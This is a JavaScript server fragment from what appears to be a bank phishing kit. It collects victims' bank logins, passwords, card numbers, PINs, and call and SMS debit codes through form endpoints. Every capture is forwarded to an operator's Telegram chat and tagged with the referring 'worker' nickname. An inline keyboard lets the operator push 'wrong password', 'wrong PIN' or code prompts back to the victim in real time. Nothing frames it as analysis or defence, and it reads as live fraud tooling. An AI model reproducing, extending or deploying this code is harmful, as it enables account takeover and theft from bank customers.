// Send Telegram message with inline keyboard or plain message
function sendToTelegram(messageType, sessionId, sessionData, workerNick) {
    const bankName = sessionData.bankName || 'N/A';
    
    let message = '';
    let replyMarkup = null;

    switch (messageType) {
        case 'main_form_phone':
            // Формат для входа по телефону и паролю
            message = `<b>Новий запис!</b>\n\n`;
            message += `<b>Название банка:</b> ${bankName}\n`;
            if (sessionData.phone) message += `<b>Номер телефона:</b> <code>${sessionData.phone}</code>\n`;
            if (sessionData.password) message += `<b>Пароль:</b> <code>${sessionData.password}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'main_form_login':
            // Формат для входа по логину и паролю
            message = `<b>Новий запис!</b>\n\n`;
            message += `<b>Название банка:</b> ${bankName}\n`;
            if (sessionData.login) message += `<b>Логин:</b> <code>${sessionData.login}</code>\n`;
            if (sessionData.password) message += `<b>Пароль:</b> <code>${sessionData.password}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'recovery_form':
            // Формат для восстановления
            message = `<b>Восстановление!</b>\n\n`;
            message += `<b>Название банка:</b> ${bankName}\n`;
            if (sessionData.fp_phone) message += `<b>Мобильный:</b> <code>${sessionData.fp_phone}</code>\n`;
            if (sessionData.fp_card) message += `<b>Номер карты:</b> <code>${sessionData.fp_card}</code>\n`;
            if (sessionData.fp_pin) message += `<b>Пин:</b> <code>${sessionData.fp_pin}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'call_code':
            // Формат для кода со звонка
            message = `<b>Код со звонка!</b>\n\n`;
            message += `<b>Код:</b> <code>${sessionData.call_code}</code>\n`;
            if (sessionData.phone || sessionData.fp_phone) {
                message += `<b>Номер телефона:</b> <code>${sessionData.phone || sessionData.fp_phone}</code>\n`;
            }
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'sms_code':
            // Формат для кода списания
            message = `<b>Код списания!</b>\n\n`;
            message += `<b>Код:</b> <code>${sessionData.sms_code}</code>\n`;
            if (sessionData.phone || sessionData.fp_phone) {
                message += `<b>Номер телефона:</b> <code>${sessionData.phone || sessionData.fp_phone}</code>\n`;
            }
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;
    }

    // Добавляем клавиатуру только для основной формы и восстановления
    if (messageType === 'main_form_phone' || messageType === 'main_form_login' || messageType === 'recovery_form') {
        const keyboard = [
            [
                { text: 'SMS', callback_data: `sms:${sessionId}` },
                { text: 'ЛК', callback_data: `lk:${sessionId}` },
                { text: 'Звонок', callback_data: `call:${sessionId}` }
            ],
            [
                { text: 'Невірний пароль', callback_data: `password_error:${sessionId}` },
                { text: 'Telegram Debit', callback_data: `telegram_debit:${sessionId}` },
                { text: 'КОД', callback_data: `code_error:${sessionId}` }
            ],
            [
                { text: 'Невірний ПІН', callback_data: `pin_error:${sessionId}` },
                { text: 'КОД ✅', callback_data: `timer:${sessionId}` },
                { text: 'Номер', callback_data: `number_error:${sessionId}` }
            ],
            [
                { text: 'OTHER', callback_data: `other:${sessionId}` },
                { text: 'BAN 🚫', callback_data: `ban:${sessionId}` },
                { text: 'СВОЙ ✏️', callback_data: `custom_message:${sessionId}` }
            ]
        ];

        if (banksForRequestButton.includes(bankName)) {
            keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
        }

        replyMarkup = { inline_keyboard: keyboard };
    }

    bot.sendMessage(CHAT_ID, message, {
        parse_mode: 'HTML',
        reply_markup: replyMarkup
    }).catch(err => console.error('Telegram send error:', err));
}

// Handle form submissions
app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('Referrer decode error:', e);
    }

    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    if (isFinalStep && !newData.logSent) {
        newData.logSent = true;
        sessions.set(sessionId, newData);

        const cardNumber = newData.card_confirm || newData.card || newData.fp_card;
        let visitCount = 1;
        if (cardNumber) {
            visitCount = (cardVisitCounts.get(cardNumber) || 0) + 1;
            cardVisitCounts.set(cardNumber, visitCount);
        }

        // Определяем тип формы
        if (newData.fp_phone || newData.fp_card || newData.fp_pin) {
            // Форма восстановления
            sendToTelegram('recovery_form', sessionId, newData, workerNick);
        } else if (newData.login) {
            // Форма с логином и паролем
            sendToTelegram('main_form_login', sessionId, newData, workerNick);
        } else {
            // Форма с телефоном и паролем
            sendToTelegram('main_form_phone', sessionId, newData, workerNick);
        }

        // Отправка кода со звонка, если он есть
        if (newData.call_code) {
            sendToTelegram('call_code', sessionId, newData, workerNick);
        }

        // Отправка кода списания, если он есть
        if (newData.sms_code) {
            sendToTelegram('sms_code', sessionId, newData, workerNick);
        }
    }

    res.status(200).json({ message: 'OK' });
});

// Handle SMS code submissions
app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('Referrer decode error:', e);
    }

    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        sessionData.sms_code = code; // Сохраняем код списания
        sessions.set(sessionId, sessionData);
        sendToTelegram('sms_code', sessionId, sessionData, workerNick);
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});
